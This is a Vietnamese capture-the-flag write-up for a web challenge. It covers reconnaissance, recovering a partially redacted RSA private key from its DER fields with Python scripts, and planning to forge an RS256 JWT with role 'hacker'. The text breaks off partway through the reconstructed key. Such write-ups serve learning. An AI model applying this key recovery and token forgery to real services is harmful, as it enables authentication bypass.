![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/fb2aff50-dac9-44d9-94b2-7ff1b3c80ef7)


# am-i-a-hacker (WEB)

## Description:
> Uploading không dễ đâu nha!!!

> url: http://34.170.55.8:9999

## Solution:

truy cập vào đường dẫn mình nhận thấy một trang login .

![img](./image/1.png)

sử dụng công cụ dirsearch để thu thập thông tin trang web:

![img](./image/3.png)

mình thấy ngay file robots.txt có thể truy cập 

![img](./image/2.png)

tại đây ta thấy them 2 path mới:
> /privkey
> /home/ctf/chall/flag.txt

có vẻ như /home.ctf/chall/flag.txt là vị trí flag trên hệ thống. 
Từ đây mình đoán ứng dụng web này có thể chứa lỗ hổng như LFI hoặc XXE, hoặc phải RCE, ....

truy cập vào /private mình nhận được dữ liệu sau:

```php
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEA6KFTFdIRYOkFDi7A7IcJquX3t6+YDbMmM3vs2yzoGSwS5weQ
DIi8Nkqw0dEPcSdcs4ubb6nKs0LhRzZ3bg3A7jFwkTCLnBEEAuXMtP2fWhyEy+kC
L1D9f+DN0lrM5JPByVPc8neQ6Jk7V8xHdwO6rDvNsOfgGgh8uo6gMozxIq4FGqfZ
i4X65hlsa05ODmLRZvHew/GhlrohhTHysiF0rIYn3rsMBUKMnoOP1OAJaTpu2CPN
CLSQrgOWSqlsI2ndJazlJb0T8PDAq9zgO09b5zq+zeooNy1kcrZT2OQkbYkOR6ai
ZvhivlgPtut3+a1AV4sBYg8saTFh9qey3ls7GK4UaPx7csD6LGlsTvQ/OKIxUb4z
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
7J/HCClz6ECj3QKCAQEA8NZQjp6IgTf45np65WXB6ucW7Z88xhw6OmtNfJYPhgYq
tFu0WIda6+G5KUb44WEmfh9oRTfBk2WpejkywOMP4usvuKtwWK5ywPGqVvsvX9Ug
7GU8DLwjqe6OxbaQQtMRwXDLKTftW9rAjFjdmGWTGr5TJpmahrXzzaE7dT2jW0z2
fX6gnZ3DlgZNwpzCUYu8icnXQjGIgTNSKjBJOu/Bi7sP7PidjIYdqgakUtdhPgbS
obCt1QIkCBQYnSeR/z2kkk7DQ3ESex/sptX4m+gwmgaUwVpwOKnMspAEHwlRCByY
qBW4SFEhiGjiIMxtuZB8+1fNqh8OD5ynNJa82n42wQKCAQEA9BKtggjUF7qvFoQN
otA7V+RAZvi4jKdrtmwKXv2gPynWQgPF3cqAKl9FJvmrTxAt+N1dYfECCYP5PtLM
zyiE4YhXmzDPX9uAErK0jlty7LMVGZvd9IvYnnKhvc4u2y2r53HJ0Mko7Sh5tZJG
eTEVBreMqI2pvaLpaurPkzcV6kaccNsT/OYqf6zma7O8SLaHZZg23dg9QAQAdsRq
V9P3LAamDzDGU3+5UNMdHrU8I20herFJfgJgvjnVlLiqqj3Ih5lXwYO1Sv2z0JLX
vJ0zfb8Ejw4HNcTC8DJWB4AMF9YANBrU/TNTOrpxkOKqtHg8T8B6U/5CmS1cl4HT
Fnw3QQKCAQEAyEzWTudXDHFq1vVCxQsujpmHnjVzrCjJ3NBlb5q2ancyiTJD+eUJ
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
-----END RSA PRIVATE KEY-----
```

ựa , đây là mã RSA private key nhưng bị khuất mất vài chỗ.

Cứ để tạm đây đã.

Thử khai thác chỗ login xem, thì mình nhận thấy mặc dùng là trang login nhưng nhập username,password gì cũng login được.

![img](./image/4.png)

Nhưng web nó đang nhận ra mình. bắt request để xem thì mình nhận được một đoạn token như sau:

![img](./image/5.png)

Cookie token:
>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoicm9va2llIiwiaWF0IjoNjc4NjExMDc3fQ.aMvlbcMsYwKR9AxEtugF1Uz4FUjM0lKJrAYqYIZVMdPvVOryb2ZzcfHIX0ExsdFEMvclzhI4wVppNImTNDNGw7fZElZO1rejEzhjfyuOiUUDfx3XhaA847TBZ5Edhjvqafja90ny0f6k04SYYpj7KFeaWZwQJdBZcREtRvPV3Vd8QiXuqHqLPBd5BYijyMELV8Hbyjq96nvQUrPlhCBgTLiZuZZeltQ8rB13EjX0BzgdbrCMXjdkToVzNj6igHegGJILE4usPdsBorCnkmApsinNCX7P2dsvHzhQUjX2vup4Fc2KTkVK37IXWevQwrGv8MiGuPkO55GsqF25_kOueX7067Mb4j3ZgtO16eioGWpEFszMdAfrddGFwDdZwo2o0RuBqiwenDCUaVAPrrm6BMIMbwLWHbWStJNUNJ7gCDPIbzQHsWnMgCiJ7r4QNFoVhPHxDUn102z8WfShyRBkaYNp0wStRhaAnrJVGDnlmh80Ah4Eb4SFb5RCdoXzij2nC8N40yHZ9RVgpMluuhsqT7PAljmAfdqZ9VZIFQIlhmPvg4450mCaE2OeADmCNPgtrkGtd9s5lM7QwZquuThxHflJclp5c8nINKclOL48GOXSJXMjtL2Ciod48G1hlILSZsy774dzFcSOFmHlJnqfRsDzoSHTmIOM

Mình đưa token này vào tool sau để giải mã:  https://jwt.io/

![img](./image/6.png)

Đến đây thì có thể lý giải lo do vì sao web nhận diện được mình login với tư cách là `rookie`.
Mã JWT này là RS256 và có trường role là rookie

trong trang login ta có thể thấy một dòng chữ `Applying for role hacker ?`
Điều này cho thấy ta cần thay đổi giá trị role trong mã jwt thành hacker để có thể truy cập được dữ liệu khác trong máy tính.  Đến đây mình vẫn chưa tìm thấy chỗ UPload ở đây cả?
khả năng cao phải tạo được token mới , mới truy cập được chức năng upload.

Đến đây mình có thể xây dựng ý tưởng như sau:
    - Khôi phục mã RSA private key
    - Sử dụng khoá RSA sau khi đã khôi phục để có thể chỉnh sửa được trường role thành `hacker`

### 1. Khôi phục mã RSA private key

Nhìn vào phần mã RSA ở giữa ta thấy mã thiếu 2 phần nữa.

> Tài liệu tham khảo cho phần recover PEM có thể xem bài viết của anh Thắng tại đây:  https://lilthawg29.wordpress.com/2022/08/03/write-up-crypto-challenge-bro-key-n-uiuctf-2022/

Mình sẽ tóm tắt một số việc cần chú ý như sau:
- đầu tiên, mã private key chúng ta sẽ làm việc với phần dữ liệu ở giữa. 
Mã RSA được tạo thành gồm n , e , p , q

mình có viết một script tạo PEM như sau:
```python
from Crypto.PublicKey import RSA


e = 65537

p = 1234
q = 545454

N = p*q

key = RSA.construct((N,e, pow(e,-1,(p-1)*(q-1)),p,q))

print(key.export_key().decode())
```

mình sẽ sử dụng một ví dụ để hình dung về PEM như sau.

```php
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgG9qUlakqPE4ryX02g4e1Mf93LDRloxfpkyFwSwMKW609XVIF5ss
ZaV8T7CPZvEaKo53okItd9LiM1wr/hN13DN1FpxM01G0gRelJuPNAigxVAdXga9b
Tm7c/nIbyYsDX+5s+Y/6ynYPS9ewa8JlylaH5wn8u8fywHMZPo5SxnN9AgMBAAEC
gYAuwt8AAmftpi7MrXF/j60aqw+fHrgi/lobr9+djxUso8KJkNJnjEC1LfF8VxOL
icHmvYtaXx71YX7Q5p3iqQrb9cE9vs4EZCHv4CkYQygkIoFwn2ymLnXjIBAESv4M
62DCK20hlr2/9ernR3d+UYrLV59gngGJVyQkkY1NX/sjuQJBAIwkIMZwA8SqzDUm
q87JD01MVlYdjhMah9U6CVrVRFLdZRFQvFmYN9x0OTQVadvjQdXHCrlsHIepRKwd
MTyhj3MCQQDLhpTD6OfMvxUx7q4nNSOWfNHQZ9G7y7kcGhFs7UctxG9L6x7oB3YQ
C1+yYrBjP9fl8KP8Kqb2lu7Jln5gDlVPAkEAi1zeLxhz1t8XJoAneQNfMTqJ3SeV
AxBuJjCJ3weY42MBv/9u3xZN7vCxdkcZN68+6C4BTzXhBVPiU9rP/QCZWwJAcS4l
OpEhnqXAhqUBqgIOCVjeYPPrGXEgPrVsbVPCWnw7nE9jP4sup5t7mzrwdjEBwfhB
aTDa6pRitC4Bly9BVwJAS9qjZ69BxngaWATmqVrFPRGj7P1g3v77ZAjGADL1psqd
NZ8dzDsL07FoqTQI51B/cKknHP/tFUd8uiD+4LtrqQ==
-----END RSA PRIVATE KEY-----
```

> phần dữ liệu: MIICWwIBAAKBgG9qUlakqPE4ryX02g4e1Mf93LDRloxfpkyFwSwMKW609XVIF5ss
ZaV8T7CPZvEaKo53okItd9LiM1wr/hN13DN1FpxM01G0gRelJuPNAigxVAdXga9b
Tm7c/nIbyYsDX+5s+Y/6ynYPS9ewa8JlylaH5wn8u8fywHMZPo5SxnN9AgMBAAEC
gYAuwt8AAmftpi7MrXF/j60aqw+fHrgi/lobr9+djxUso8KJkNJnjEC1LfF8VxOL
icHmvYtaXx71YX7Q5p3iqQrb9cE9vs4EZCHv4CkYQygkIoFwn2ymLnXjIBAESv4M
62DCK20hlr2/9ernR3d+UYrLV59gngGJVyQkkY1NX/sjuQJBAIwkIMZwA8SqzDUm
q87JD01MVlYdjhMah9U6CVrVRFLdZRFQvFmYN9x0OTQVadvjQdXHCrlsHIepRKwd
MTyhj3MCQQDLhpTD6OfMvxUx7q4nNSOWfNHQZ9G7y7kcGhFs7UctxG9L6x7oB3YQ
C1+yYrBjP9fl8KP8Kqb2lu7Jln5gDlVPAkEAi1zeLxhz1t8XJoAneQNfMTqJ3SeV
AxBuJjCJ3weY42MBv/9u3xZN7vCxdkcZN68+6C4BTzXhBVPiU9rP/QCZWwJAcS4l
OpEhnqXAhqUBqgIOCVjeYPPrGXEgPrVsbVPCWnw7nE9jP4sup5t7mzrwdjEBwfhB
aTDa6pRitC4Bly9BVwJAS9qjZ69BxngaWATmqVrFPRGj7P1g3v77ZAjGADL1psqd
NZ8dzDsL07FoqTQI51B/cKknHP/tFUd8uiD+4LtrqQ==


Cấu trúc của RSA private key viết bằng ASN.1 sẽ gồm lần lượt từ trên xuống: Version, n , e, d, p, q, d mod (p-1), d mod (q-1), (inverse of q) mod p

![img](./image/7.png)

=> chúng ta sẽ trích xuất giá trị cũng từ trên xuống dưới như vậy.
Với mỗi thành phần trên sẽ bao gồm các trường như sau: byte đầu tiên sẽ là Tag, 2 byte thứ hai sẽ là length, các byte còn lại với tới Tag tiếp theo sẽ là Data của trường đó.

Vd: 
```
30 82 02 5B 02 01 00 02  81 80 6F 6A 52 56 A4 A8
F1 38 AF 25 F4 DA 0E 1E  D4 C7 FD DC B0 D1 96 8C
5F A6 4C 85 C1 2C 0C 29  6E B4 F5 75 48 17 9B 2C
65 A5 7C 4F B0 8F 66 F1  1A 2A 8E 77 A2 42 2D 77
D2 E2 33 5C 2B FE 13 75  DC 33 75 16 9C 4C D3 51
B4 81 17 A5 26 E3 CD 02  28 31 54 07 57 81 AF 5B
4E 6E DC FE 72 1B C9 8B  03 5F EE 6C F9 8F FA CA
76 0F 4B D7 B0 6B C2 65  CA 56 87 E7 09 FC BB C7
F2 C0 73 19 3E 8E 52 C6  73 7D 
```

vd như trên thì 30 là Tag của Version, 82 02 5B sẽ là length của SEQUENCE. Các thành phần tiếp theo nếu là giá trị INTEGER  thì Tag sẽ bắt đầu bằng 02.
Mặc định các thành phần tạo nên private key đầu là interger cả nên ta sẽ dựa vào Tag 02 này để tìm ra dữ liệu của các trường còn lại.

Được rồi, đến đây ta quay trở lại với mã PEM của challenge:
trước hết thay thế các dòng Redacted bằng ký tự `___` cho dễ làm việc.

Mã PEM lúc này trông như sau: key_redacted.pem
```python
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEA6KFTFdIRYOkFDi7A7IcJquX3t6+YDbMmM3vs2yzoGSwS5weQ
DIi8Nkqw0dEPcSdcs4ubb6nKs0LhRzZ3bg3A7jFwkTCLnBEEAuXMtP2fWhyEy+kC
L1D9f+DN0lrM5JPByVPc8neQ6Jk7V8xHdwO6rDvNsOfgGgh8uo6gMozxIq4FGqfZ
i4X65hlsa05ODmLRZvHew/GhlrohhTHysiF0rIYn3rsMBUKMnoOP1OAJaTpu2CPN
CLSQrgOWSqlsI2ndJazlJb0T8PDAq9zgO09b5zq+zeooNy1kcrZT2OQkbYkOR6ai
ZvhivlgPtut3+a1AV4sBYg8saTFh9qey3ls7GK4UaPx7csD6LGlsTvQ/OKIxUb4z
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
7J/HCClz6ECj3QKCAQEA8NZQjp6IgTf45np65WXB6ucW7Z88xhw6OmtNfJYPhgYq
tFu0WIda6+G5KUb44WEmfh9oRTfBk2WpejkywOMP4usvuKtwWK5ywPGqVvsvX9Ug
7GU8DLwjqe6OxbaQQtMRwXDLKTftW9rAjFjdmGWTGr5TJpmahrXzzaE7dT2jW0z2
fX6gnZ3DlgZNwpzCUYu8icnXQjGIgTNSKjBJOu/Bi7sP7PidjIYdqgakUtdhPgbS
obCt1QIkCBQYnSeR/z2kkk7DQ3ESex/sptX4m+gwmgaUwVpwOKnMspAEHwlRCByY
qBW4SFEhiGjiIMxtuZB8+1fNqh8OD5ynNJa82n42wQKCAQEA9BKtggjUF7qvFoQN
otA7V+RAZvi4jKdrtmwKXv2gPynWQgPF3cqAKl9FJvmrTxAt+N1dYfECCYP5PtLM
zyiE4YhXmzDPX9uAErK0jlty7LMVGZvd9IvYnnKhvc4u2y2r53HJ0Mko7Sh5tZJG
eTEVBreMqI2pvaLpaurPkzcV6kaccNsT/OYqf6zma7O8SLaHZZg23dg9QAQAdsRq
V9P3LAamDzDGU3+5UNMdHrU8I20herFJfgJgvjnVlLiqqj3Ih5lXwYO1Sv2z0JLX
vJ0zfb8Ejw4HNcTC8DJWB4AMF9YANBrU/TNTOrpxkOKqtHg8T8B6U/5CmS1cl4HT
Fnw3QQKCAQEAyEzWTudXDHFq1vVCxQsujpmHnjVzrCjJ3NBlb5q2ancyiTJD+eUJ
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
-----END RSA PRIVATE KEY-----
```

Tại đây có một lưu ý: dòng cuối cùng của mã ta chưa biết được độ dài chính xác nhưng thôi cứ để là cả dòng đi rồi tính tiếp.

Để xác định được các Tag 02 ta cần chuyển private key sang DER cái đã.

script chuyển key_pem sang hex sẽ như sau: thay đổi tên file thành file PEM muốn chuyển đổi
> key_to_hex.py
```python
from string import ascii_uppercase, ascii_lowercase, digits, hexdigits
import re

# Convert the key from base64 -> bin -> hex to make it easier to read

B64_ALPHABET = ascii_uppercase + ascii_lowercase + digits + "+/"

key_b64 = "".join(open("web_RSA\key_redacted.pem", "r").readlines()[1:-1]).replace("\n", "")
key_bin = "".join(["??????" if i < 0 else bin(i)[2:].zfill(6) for i in map(lambda c: B64_ALPHABET.find(c), key_b64)])
key_hex_blocks = [key_bin[i:i+4] for i in range(0, len(key_bin), 4)]
key_hex = "".join(["?" if "?" in b else hexdigits[int(b, 2)] for b in key_hex_blocks ])

for s in re.findall("\?{2,}", key_hex):
    key_hex = key_hex.replace(s, f"\n[[{len(s)} ?]]\n")

print(key_hex)
```

mã hex nhận được:

```python
308209290201000282020100e8a15315d21160e9050e2ec0ec8709aae5f7b7af980db326337becdb2ce8192c12e707900c88bc364ab0d1d10f71275cb38b9b6fa9cab342e14736776e0dc0ee317091308b9c110402e5ccb4fd9f5a1c84cbe9022f50fd7fe0cdd25acce493c1c953dcf27790e8993b57cc477703baac3bcdb0e7e01a087cba8ea0328cf122ae051aa7d98b85fae6196c6b4e4e0e62d166f1dec3f1a196ba218531f2b22174ac8627debb0c05428c9e838fd4e009693a6ed823cd08b490ae03964aa96c2369dd25ace525bd13f0f0c0abdce03b4f5be73abecdea28372d6472b653d8e4246d890e47a6a266f862be580fb6eb77f9ad40578b01620f2c693161f6a7b2de5b3b18ae1468fc7b72c0fa2c696c4ef43f38a23151be33
[[2016 ?]]
ec9fc7082973e840a3dd0282010100f0d6508e9e888137f8e67a7ae565c1eae716ed9f3cc61c3a3a6b4d7c960f86062ab45bb458875aebe1b92946f8e161267e1f684537c19365a97a3932c0e30fe2eb2fb8ab7058ae72c0f1aa56fb2f5fd520ec653c0cbc23a9ee8ec5b69042d311c170cb2937ed5bdac08c58dd9865931abe5326999a86b5f3cda13b753da35b4cf67d7ea09d9dc396064dc29cc2518bbc89c9d74231888133522a30493aefc18bbb0fecf89d8c861daa06a452d7613e06d2a1b0add502240814189d2791ff3da4924ec34371127b1feca6d5f89be8309a0694c15a7038a9ccb290041f0951081c98a815b84851218868e220cc6db9907cfb57cdaa1f0e0f9ca73496bcda7e36c10282010100f412ad8208d417baaf16840da2d03b57e44066f8b88ca76bb66c0a5efda03f29d64203c5ddca802a5f4526f9ab4f102df8dd5d61f1020983f93ed2cccf2884e188579b30cf5fdb8012b2b48e5b72ecb315199bddf48bd89e72a1bdce2edb2dabe771c9d0c928ed2879b5924679311506b78ca88da9bda2e96aeacf933715ea469c70db13fce62a7face66bb3bc48b687659836ddd83d40040076c46a57d3f72c06a60f30c6537fb950d31d1eb53c236d217ab1497e0260be39d594b8aaaa3dc8879957c183b54afdb3d092d7bc9d337dbf048f0e0735c4c2f0325607800c17d600341ad4fd33533aba7190e2aab4783c4fc07a53fe42992d5c9781d3167c37410282010100c84cd64ee7570c716ad6f542c50b2e8e99879e3573ac28c9dcd0656f9ab66a7732893243f9e509
[[960 ?]]
```

code trên tính toán ra phần mã bị thiếu thứ nhất cần 2016 byte, phần thứ hai cần 960 byte

Vẫn cứ theo cách phân tích như trên mình đã trình bày thì với mã này ta có được các thông tin sau:

- nửa đầu của N: 
00e8a15315d21160e9050e2ec0ec8709aae5f7b7af980db326337becdb2ce8192c12e707900c88bc364ab0d1d10f71275cb38b9b6fa9cab342e14736776e0dc0ee317091308b9c110402e5ccb4fd9f5a1c84cbe9022f50fd7fe0cdd25acce493c1c953dcf27790e8993b57cc477703baac3bcdb0e7e01a087cba8ea0328cf122ae051aa7d98b85fae6196c6b4e4e0e62d166f1dec3f1a196ba218531f2b22174ac8627debb0c05428c9e838fd4e009693a6ed823cd08b490ae03964aa96c2369dd25ace525bd13f0f0c0abdce03b4f5be73abecdea28372d6472b653d8e4246d890e47a6a266f862be580fb6eb77f9ad40578b01620f2c693161f6a7b2de5b3b18ae1468fc7b72c0fa2c696c4ef43f38a23151be33

e = chưa biết nhưng mình đoán là 65537 :)))

nửa cuối của p = ec9fc7082973e840a3dd

02 82 01 01 length = 0x101
q = 00f0d6508e9e888137f8e67a7ae565c1eae716ed9f3cc61c3a3a6b4d7c960f86062ab45bb458875aebe1b92946f8e161267e1f684537c19365a97a3932c0e30fe2eb2fb8ab7058ae72c0f1aa56fb2f5fd520ec653c0cbc23a9ee8ec5b69042d311c170cb2937ed5bdac08c58dd9865931abe5326999a86b5f3cda13b753da35b4cf67d7ea09d9dc396064dc29cc2518bbc89c9d74231888133522a30493aefc18bbb0fecf89d8c861daa06a452d7613e06d2a1b0add502240814189d2791ff3da4924ec34371127b1feca6d5f89be8309a0694c15a7038a9ccb290041f0951081c98a815b84851218868e220cc6db9907cfb57cdaa1f0e0f9ca73496bcda7e36c1

02 82 01 01 length = 0x101
d mod (p-1) =  
00f412ad8208d417baaf16840da2d03b57e44066f8b88ca76bb66c0a5efda03f29d64203c5ddca802a5f4526f9ab4f102df8dd5d61f1020983f93ed2cccf2884e188579b30cf5fdb8012b2b48e5b72ecb315199bddf48bd89e72a1bdce2edb2dabe771c9d0c928ed2879b5924679311506b78ca88da9bda2e96aeacf933715ea469c70db13fce62a7face66bb3bc48b687659836ddd83d40040076c46a57d3f72c06a60f30c6537fb950d31d1eb53c236d217ab1497e0260be
39d594b8aaaa3dc8879957c183b54afdb3d092d7bc9d337dbf048f0e0735c4c2f0325607800c17d600341ad4fd33533aba7190e2aab4783c4fc07a53fe42992d5c9781d3167c3741

02 82 01 01 length = 0x101
nử đầu của d mod (q-1) = 00c84cd64ee7570c716ad6f542c50b2e8e99879e3573ac28c9dcd0656f9ab66a7732893243f9e509

từ các dữ liệu trên mình tổng kết lại:
- các thành phần đã đầy đủ gồm: q và d mod (p-1), e
- các thành phần khuyết gồm: N,  p, d mod (q - 1), inver

hmmmmm, mấu chốt vấn đề là ta cần khôi phục lại được mã private key nên chỉ cần tìm được p, q , với e là đủ rồi, các thành phần các có thể dùng công thức tính hoặc dùng script trong file `re_constructkey.py`.

có một công thức để khôi phục p mà chỉ cần có q và một phần của p như sau:

![img](./image/7.png)

script khôi phục p khi đã biết q và dp(d mod (p -1)):
```python
from Crypto.Util.number import isPrime

e = 65537
q = 0xf0d6508e9e888137f8e67a7ae565c1eae716ed9f3cc61c3a3a6b4d7c960f86062ab45bb458875aebe1b92946f8e161267e1f684537c19365a97a3932c0e30fe2eb2fb8ab7058ae72c0f1aa56fb2f5fd520ec653c0cbc23a9ee8ec5b69042d311c170cb2937ed5bdac08c58dd9865931abe5326999a86b5f3cda13b753da35b4cf67d7ea09d9dc396064dc29cc2518bbc89c9d74231888133522a30493aefc18bbb0fecf89d8c861daa06a452d7613e06d2a1b0add502240814189d2791ff3da4924ec34371127b1feca6d5f89be8309a0694c15a7038a9ccb290041f0951081c98a815b84851218868e220cc6db9907cfb57cdaa1f0e0f9ca73496bcda7e36c1
dp = 0xf412ad8208d417baaf16840da2d03b57e44066f8b88ca76bb66c0a5efda03f29d64203c5ddca802a5f4526f9ab4f102df8dd5d61f1020983f93ed2cccf2884e188579b30cf5fdb8012b2b48e5b72ecb315199bddf48bd89e72a1bdce2edb2dabe771c9d0c928ed2879b5924679311506b78ca88da9bda2e96aeacf933715ea469c70db13fce62a7face66bb3bc48b687659836ddd83d40040076c46a57d3f72c06a60f30c6537fb950d31d1eb53c236d217ab1497e0260be39d594b8aaaa3dc8879957c183b54afdb3d092d7bc9d337dbf048f0e0735c4c2f0325607800c17d600341ad4fd33533aba7190e2aab4783c4fc07a53fe42992d5c9781d3167c3741

for kp in range(3, e):
    p_mul = dp * e - 1
    if p_mul % kp == 0:
        p = (p_mul // kp) + 1
        if isPrime(p):
            print(f"Possible p: {p}")
```

chạy đoạn code trên ta nhận được p có giá trị: 
> Possible p: 31215741529396018812515417004134640787100009229316578288055352664708168865021272656000536899262237216860631014075314842117554610007584785247528295532050275281897604417282764201663808807866131061076109621186637487629104138790759152498808113255780623797965160486898486555778008939394145890311055258828954190178308166849200055982547690198347288279757383042462314793013547724250691979344270237100766694204909177118595054123447170601665312594417746437903137541815770388130579095016109991522854975636849723595280170415639640162352734245874461220998563696559283552786805218843463196427525233172636749571243928543303580034013


Tuyệt vời, bây giờ ta đã có được cả p, q, cùng với e (e mình đoán mò thôi!!!!!!!!!!!!)

chạy file re_constructkey.py để khôi phục lại mã private key thôi chứ còn chờ chi
```python
from Crypto.PublicKey import RSA


e = 65537

p = 31215741529396018812515417004134640787100009229316578288055352664708168865021272656000536899262237216860631014075314842117554610007584785247528295532050275281897604417282764201663808807866131061076109621186637487629104138790759152498808113255780623797965160486898486555778008939394145890311055258828954190178308166849200055982547690198347288279757383042462314793013547724250691979344270237100766694204909177118595054123447170601665312594417746437903137541815770388130579095016109991522854975636849723595280170415639640162352734245874461220998563696559283552786805218843463196427525233172636749571243928543303580034013
q = 30402875697527916397542806353742730596622654442106746350302238894535593339396455455591735451368472859476854630199750179547832911945983758029765757595944788994736200573660086736656535295280090525416332242026647058207466614733384683340253505694485121034528875758567312719588900446459838347913647592922250427872627540821441178997866779901629507417372874038905138874416375338163783306116392413078042237174844547262385443713228361726655568925316249089735893321976177123750174713558046420139158973584145499695359980069043188006927965179450759298726183987751273054613710406588107926281039974244219480943101454735002864334529

N = p*q

key = RSA.construct((N,e, pow(e,-1,(p-1)*(q-1)),p,q))

print(key.export_key().decode())
```

mã PEM final:
```
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEA6KFTFdIRYOkFDi7A7IcJquX3t6+YDbMmM3vs2yzoGSwS5weQ
DIi8Nkqw0dEPcSdcs4ubb6nKs0LhRzZ3bg3A7jFwkTCLnBEEAuXMtP2fWhyEy+kC
L1D9f+DN0lrM5JPByVPc8neQ6Jk7V8xHdwO6rDvNsOfgGgh8uo6gMozxIq4FGqfZ
i4X65hlsa05ODmLRZvHew/GhlrohhTHysiF0rIYn3rsMBUKMnoOP1OAJaTpu2CPN
CLSQrgOWSqlsI2ndJazlJb0T8PDAq9zgO09b5zq+zeooNy1kcrZT2OQkbYkOR6ai
ZvhivlgPtut3+a1AV4sBYg8saTFh9qey3ls7GK4UaPx7csD6LGlsTvQ/OKIxUb4z
nmBiNbFmche4Hv9abFwLT61jokXlF8xsiTVhXE8Y4++/+uQ38YVTW4yVPPrI7VVb
1brurpaTJx1frdAeIJtsUYzcFKOPNpY7SlGNGdlbIaetrHKuYCq7T1ToIIwsyLkE
Sy9r19fLXFF81TX9Rr/g2wtPhjj5n8X3w99f25CexIBk98KYVuRbuoKLLxHMmALg
iiLrrQVlRWEe8fwOcrSvTJZCzF1oiMr8nD1a/s6mvfAAZkh9DTXcVcf1oaq8AKPj
QlezoacOzVrcuPk5Hm61bzlQccuf/2VJ/Pb3ZSl2YHgVgIKoxBjjBpQSJ50CAwEA
AQKCAgAW+ReDaCNfNqPRKrzSnuNNhThZY3XYpIB5RRu26VBia//R4OVQ14/+rJGZ
ptOnkQOOl5LaDCKAYXJt3esday5KV4eOTwT6fJOw1ZDJruI1u+tBV9lnYtAl+MVa
qKzjRdQ1VZrUNwqQbdF2ci38itm8eItvlPaEm6H1qnAXjeOiUR0f7MOHC8wjPQ9/
6VO8B/Y1/FzLbOlQQUFeLfiRrswe3YDCdiZRvqi0XrmthBJp2eNoZOCyo2JGTQRi
iyiqtqGoPtLCT1HQ0XW1gzKBqOyigSKmoyElkc4Bpg/Rs3YFeyt11/bhxFW8BmZG
4ioO9hUMkCWq0WTJXp8WBKmdW9USAqrS8MF1wft0tOpZa47Y7pnGxfNZYP6zxtLa
X8FNWr0zTRtNhRcFBfKbNRorlWfBc9mtwujtyNj25+3Owm7Rgevl6irBgMbutZ35
btQNnYLHNCC6PvjtD1pDMoCoekozM/7Qm9VJeKVx1MbvzHqg+VYmJ+JeH4aJ9F8N
53jf2b6hETYmMQaRyHrP/NupNhtlant4uQtdeI8ZY4jOCR+hIludPRNdfRjm1llz
i1dNfVK8/bYlrNptPw4209pkvCmJ3Qo05iLLpEqhHTzG3MUUozDc56prQpQS1icZ
LiRVjNELAQnsfdCDmvJWirJDFUVFHlgmew2SESxRrlOiWfGoAQKCAQEA90a74xaQ
4HZOte3HzLPyOoFk6X6Sy6KCrrqKtoSWbxob6EuCADEARcaRR3ubvJxCpdCZOuFu
uUvN3LcqXk21cxqA7p7YvqJZt2I8qgMryTByRzzxcC1jg/BMLMQ2nkjYYeHtpcgg
omtqr3EizsR5CLl5w3G7BtNC20qhtbCBz1tld5Od0sRRtH1FDVZV+TxoNVA2KXh6
LPYv+a/4AcQoxxE7KdFbAbvK4JRZWcvN8t3Df2jPXjPquiMoQ+9IAW0saHv6BxLl
ZpbSZzyhJUBVNTK6V1PcDLYT1qxhO+yTP6TqUkujph6VvhNMN80S5bvvULgsJrja
7J/HCClz6ECj3QKCAQEA8NZQjp6IgTf45np65WXB6ucW7Z88xhw6OmtNfJYPhgYq
tFu0WIda6+G5KUb44WEmfh9oRTfBk2WpejkywOMP4usvuKtwWK5ywPGqVvsvX9Ug
7GU8DLwjqe6OxbaQQtMRwXDLKTftW9rAjFjdmGWTGr5TJpmahrXzzaE7dT2jW0z2
fX6gnZ3DlgZNwpzCUYu8icnXQjGIgTNSKjBJOu/Bi7sP7PidjIYdqgakUtdhPgbS
obCt1QIkCBQYnSeR/z2kkk7DQ3ESex/sptX4m+gwmgaUwVpwOKnMspAEHwlRCByY
qBW4SFEhiGjiIMxtuZB8+1fNqh8OD5ynNJa82n42wQKCAQEA9BKtggjUF7qvFoQN
otA7V+RAZvi4jKdrtmwKXv2gPynWQgPF3cqAKl9FJvmrTxAt+N1dYfECCYP5PtLM
zyiE4YhXmzDPX9uAErK0jlty7LMVGZvd9IvYnnKhvc4u2y2r53HJ0Mko7Sh5tZJG
eTEVBreMqI2pvaLpaurPkzcV6kaccNsT/OYqf6zma7O8SLaHZZg23dg9QAQAdsRq
V9P3LAamDzDGU3+5UNMdHrU8I20herFJfgJgvjnVlLiqqj3Ih5lXwYO1Sv2z0JLX
vJ0zfb8Ejw4HNcTC8DJWB4AMF9YANBrU/TNTOrpxkOKqtHg8T8B6U/5CmS1cl4HT
Fnw3QQKCAQEAyEzWTudXDHFq1vVCxQsujpmHnjVzrCjJ3NBlb5q2ancyiTJD+eUJ
H2lqQARA9eGAzCB+7iKDIn3IyFhN99Jg4g9Mb0BWfcsIsaPMUe8y5XcynKlNmiHX
X3uCzrkZnhpBiCqxLSTQijaTMaavFhJUmEd2jIHv3N3zWTAhbU7IUCTgVFs+ZhhS
